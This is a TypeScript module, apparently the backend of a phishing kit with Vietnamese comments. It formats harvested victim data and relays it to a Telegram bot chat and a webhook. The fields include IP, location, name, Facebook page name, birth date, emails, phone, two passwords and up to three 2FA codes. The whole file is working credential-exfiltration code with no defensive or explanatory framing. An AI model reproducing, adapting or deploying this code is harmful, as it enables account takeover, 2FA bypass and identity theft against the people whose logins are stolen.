import axios from 'axios';
import https from 'https';
import { memoryStoreTTL } from '../libs/memoryStore';
import { generateKey } from '../utils/generateKey';

const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID!;
const agent = new https.Agent({ family: 4 });

// Webhook URL
const WEBHOOK_URL = "YOUR_WEBHOOK_URL"; // Thay bằng URL webhook của bạn

function mergeData(oldData: any = {}, newData: any = {}) {
    return {
        ...oldData,
        ...Object.fromEntries(
            Object.entries(newData).filter(([_, v]) => v !== undefined && v !== '')
        )
    };
}

function formatMessage(data: any): string {
    return `
<b>Ip:</b> <code>${data.ip || 'Error'}</code>
<b>Location:</b> <code>${data.location || 'Error'}</code>
<b>Full Name:</b> <code>${data.name || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Date of birth:</b> <code>${data.day || ''}/${data.month || ''}/${data.year || ''}</code>
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.business || ''}</code>
<b>Phone Number:</b> <code>+${data.phone || ''}</code>
<b>Password First:</b> <code>${data.password || ''}</code>
<b>Password Second:</b> <code>${data.passwordSecond || ''}</code>
<b>Auth Method:</b> <code>${data.authMethod || ''}</code>
<b>2FA Codes:</b> <code>${data.twoFa || ''} | ${data.twoFaSecond || ''} | ${data.twoFaThird || ''}</code>
`.trim();
}

// Gửi lên Webhook
async function sendToWebhook(data: any) {
    try {
        await axios.post(WEBHOOK_URL, {
            timestamp: new Date().toISOString(),
            ...data
        }, { timeout: 10000 });
        console.log("✅ Sent to Webhook");
    } catch (err: any) {
        console.error("❌ Webhook send error:", err?.response?.data || err.message || err);
    }
}

// Gửi Telegram + Webhook cho 1 object
async function sendSingleData(data: any) {
    const key = generateKey(data);
    const prev = memoryStoreTTL.get(key);
    const fullData = mergeData(prev?.data, data);
    const updatedText = formatMessage(fullData);

    try {
        // Gửi Telegram
        const res = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: updatedText,
            parse_mode: 'HTML'
        }, { httpsAgent: agent, timeout: 10000 });

        const messageId = res.data.result.message_id;
        memoryStoreTTL.set(key, { message: updatedText, messageId, data: fullData });
        console.log(`✅ Sent Telegram. ID: ${messageId}`);

        // Gửi Webhook
        await sendToWebhook(fullData);

    } catch (err: any) {
        console.error('🔥 Telegram send/edit error:', err?.response?.data || err.message || err);
    }
}

// Gửi batch nhiều data
export async function sendBatchData(dataList: any[]) {
    const promises = dataList.map(data => sendSingleData(data));
    await Promise.all(promises);
    console.log("✅ All data sent");
}